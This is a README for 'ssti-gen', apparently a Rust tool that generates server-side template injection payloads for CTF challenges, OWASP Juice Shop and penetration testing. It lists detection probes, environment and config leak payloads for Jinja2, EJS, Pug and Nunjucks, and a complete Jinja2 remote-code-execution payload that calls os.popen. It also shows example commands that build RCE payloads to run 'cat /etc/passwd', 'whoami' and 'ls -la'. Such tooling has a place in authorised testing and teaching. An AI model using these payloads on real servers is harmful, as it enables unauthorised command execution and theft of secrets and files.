# ssti-gen

Server-Side Template Injection payload generator.

## Installation

```bash
cargo build --release
# Binary: target/release/ssti-gen
```

## Usage

### Detection Payloads

Test for SSTI vulnerability:

```bash
ssti-gen detect
```

Output:
```
=== SSTI Detection Payloads ===

Test these payloads to identify SSTI vulnerability:

Basic math {{7*7}}
  Payload: {{7*7}}
  Engine:  Generic
  Expect:  49 (if vulnerable)
...
```

### Engine-Specific Payloads

#### Jinja2/Python

```bash
ssti-gen jinja2
```

Shows payloads for:
- Config leak: `{{config}}`
- RCE via subclasses
- File read

#### Node.js (EJS, Pug, Nunjucks)

```bash
ssti-gen nodejs
```

Shows payloads for:
- EJS: `<%= process.env %>`
- Pug: `#{process.env}`
- Nunjucks: `{{constructor.constructor...}}`

### Generate RCE Payload

Generate custom RCE payload for specific engine:

```bash
ssti-gen rce jinja2 "id"
ssti-gen rce ejs "cat /etc/passwd"
ssti-gen rce pug "whoami"
ssti-gen rce nunjucks "ls -la"
```

Output:
```
=== RCE Payload for Jinja2 ===

Command: id

Payload:
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

### Fuzzing Payloads

Get all payloads for fuzzing:

```bash
# Summary view
ssti-gen fuzz

# List for tools (one per line)
ssti-gen fuzz --list > ssti_payloads.txt
```

### Juice Shop Challenge

```bash
ssti-gen juice-shop
```

Shows Pug-specific payloads for the SSTI challenge.

### List Supported Engines

```bash
ssti-gen engines
```

## Detection Methodology

1. **Test basic math expressions**:
   - `{{7*7}}` → 49 (Jinja2/Twig)
   - `${7*7}` → 49 (Java EL/FreeMarker)
   - `#{7*7}` → 49 (Pug/Ruby)
   - `<%= 7*7 %>` → 49 (EJS/ERB)

2. **Identify template engine** by syntax response

3. **Escalate** with engine-specific payloads

## Supported Engines

| Engine | Syntax | Language |
|--------|--------|----------|
| Jinja2 | `{{...}}` | Python |
| Twig | `{{...}}` | PHP |
| EJS | `<%= ... %>` | Node.js |
| Pug | `#{...}` | Node.js |
| Nunjucks | `{{...}}` | Node.js |
| FreeMarker | `${...}` | Java |
| Velocity | `#set(...)` | Java |

## Use Cases

### CTF Challenges
- Quick detection payloads
- Engine-specific exploitation
- Juice Shop SSTI challenge

### Security Testing
- Template injection testing
- RCE payload generation
- Fuzzing with comprehensive payload lists
